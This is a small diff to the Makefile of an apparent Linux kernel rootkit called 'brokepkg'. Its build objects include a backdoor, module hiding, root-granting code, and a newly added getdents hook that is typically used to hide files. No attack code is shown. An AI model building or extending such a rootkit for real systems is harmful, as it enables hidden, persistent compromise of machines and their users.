@@ -1,11 +1,11 @@
 obj-m := brokepkg.o
-brokepkg-objs := src/main.o src/hooks.o src/backdoor.o src/module_hide.o src/give_root.o
-SHELL := $(shell command -v bash)
+brokepkg-objs := src/main.o src/hooks.o src/backdoor.o src/module_hide.o src/give_root.o src/getdents.o
+SHELL := $(shell which bash)
 CC := gcc
 KDIR := /lib/modules/$(shell uname -r)/build
 CLIENT_NAME = brokecli
-ccflags-y += -I$(PWD)/include -Wall
 PWD := $(shell pwd)
+ccflags-y += -I$(src)/include -Wall
 SCRIPTS_DIR ?= $(PWD)/scripts
 CONFIG_SCRIPT ?= $(SCRIPTS_DIR)/config.sh
 INSTALL_SCRIPT ?= $(SCRIPTS_DIR)/install.sh
